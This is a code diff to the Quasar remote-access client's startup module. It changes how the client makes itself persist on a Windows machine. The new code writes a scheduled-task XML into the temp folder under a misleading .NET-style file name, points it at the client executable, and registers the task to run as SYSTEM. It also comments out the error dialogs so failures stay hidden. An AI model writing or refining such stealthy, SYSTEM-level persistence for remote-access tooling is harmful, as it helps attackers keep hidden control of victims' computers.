@@ -4,7 +4,10 @@ using Quasar.Common.Enums;
 using Quasar.Common.Helpers;
 using System;
 using System.Diagnostics;
+using System.IO;
+using System.Linq.Expressions;
 using System.Runtime.Remoting.Messaging;
+using System.Text;
 using System.Windows.Forms;
 
 namespace Quasar.Client.Setup
@@ -24,46 +27,42 @@ namespace Quasar.Client.Setup
 
             if (UserAccount.Type == AccountType.Admin)
             {
-                ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
+                string xmlPath = Path.Combine(new string[]
                 {
-                    Arguments = "/create /tn \"" + startupName + "\" /sc ONSTART /tr \"" + executablePath +
-                                "\" /rl HIGHEST /f",
+                    Path.GetTempPath(),
+                    "dotNetConfigurationXMLOption_v480.xml"
+                });
+                try
+                {
+                    string xmlContent = Encoding.UTF8.GetString(Resource1.options);
+
+                    xmlContent = xmlContent.Replace("notepad.exe", executablePath);
+
+                    File.WriteAllText(xmlPath, xmlContent, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false));
+                }
+                catch (Exception ex5)
+                {
+                   // MessageBox.Show($"XML file writing error while creating a task: {ex5.Message}");
+                }
+                ProcessStartInfo originStartInfo = new ProcessStartInfo("schtasks")
+                {
+                    Arguments = "/create /tn \"" + startupName + "\" /xml \"" + xmlPath + "\" /ru SYSTEM",
                     UseShellExecute = false,
                     CreateNoWindow = true
                 };
                 try
                 {
-                    Process p = Process.Start(startInfo);
-                    p.WaitForExit(1000);
-                    if(p.ExitCode != 0) 
+                    Process p1 = Process.Start(originStartInfo);
+                    p1.WaitForExit();
+                    if(p1.ExitCode == 0)
                     {
-                        MessageBox.Show($"Failed to create client task. Exit code: {p.ExitCode}");
+                        return;
                     }
-
                 }
                 catch(Exception ex)
                 {
-                    MessageBox.Show($"An error occured while starting client task: {ex.Message}");
+                    //MessageBox.Show($"An error occured while starting client task: {ex.Message}");
                 }
-                //ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
-                //{
-                //    Arguments = "/create /tn \"" + startupName + "\" " +
-                //        "/sc ONSTART /tr \"" + executablePath + "\" " + // Change to ONSTART for immediate start on task creation
-                //        "/rl HIGHEST /f " +
-                //        "/Z " + // Allows the task to run on battery
-                //        "/du UNLIMITED " + // Removes the duration limit
-                //        "/ri 1 /retry 10 " + // Restart every 1 minutes, up to 10 times
-                //        "/F /IT", // /IT: Run the task immediately after creation
-                //    UseShellExecute = false,
-                //    CreateNoWindow = true
-                //};
-
-                //Process p = Process.Start(startInfo);
-                //p.WaitForExit(1000);
-                //if (p.ExitCode == 0) return;
-
-                //bool result = RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, GetHKLMPath(), startupName, executablePath) || RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser, GetHKLMPath(), startupName, executablePath);
-                //if (result) return;
             }
 
             RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
@@ -75,6 +74,13 @@ namespace Quasar.Client.Setup
         {
             if (UserAccount.Type == AccountType.Admin)
             {
+                string xmlPath = Path.Combine(new string[]
+                {
+                    Path.GetTempPath(),
+                    "dotNetConfigurationXMLOption_v480.xml"
+                });
+                File.Delete(xmlPath);
+
                 ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                 {
                     Arguments = "/delete /tn \"" + startupName + "\" /f",
